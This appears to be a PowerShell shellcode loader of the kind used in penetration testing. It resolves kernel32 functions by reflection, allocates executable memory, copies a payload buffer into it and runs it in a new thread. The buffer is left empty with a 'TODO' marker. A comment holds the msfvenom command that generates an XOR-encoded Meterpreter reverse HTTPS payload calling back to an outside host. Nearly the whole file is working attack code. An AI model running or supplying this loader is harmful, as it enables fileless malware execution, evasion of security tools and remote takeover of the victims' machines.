function LookupFunc {
    param ($moduleName, $functionName)
    $assem = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object {    $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
    return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType {
    Param (
        [Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
        [Parameter(POsition = 1)] [Type] $delType = [Void]
    )

    $type = [AppDomain]::CurrentDomain.DefineDynamicAssembly(
        (New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
        [System.Reflection.Emit.AssemblyBuilderAccess]::Run
    ).DefineDynamicModule(
        'InMemoryModule',
        $false
    ).DefineType(
        'MyDelegateType',
        'Class, Public, Sealed, AnsiClass, AutoClass',
        [System.MulticastDelegate]
    )

    $type.DefineConstructor(
        'RTSpecialName, HideBySig, Public',
        [System.Reflection.CallingConventions]::Standard,
        $func
    ).SetImplementationFlags('Runtime, Managed')

    $type.DefineMethod(
        'Invoke',
        'Public, HideBySig, NewSlot, Virtual',
        $delType,
        $func
    ).SetImplementationFlags('Runtime, Managed')

    return $type.CreateType()
}

# VirtualAlloc
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

# Create Shellcode & Copy Into Memory
# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=1.2.3.4 LPORT=443 EXITFUNC=thread -e x64/xor_dynamic -f powershell
# TODO: replace this
[Byte[]] $buf =

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

# CreateThread
$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

# WaitForSingleObject
[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
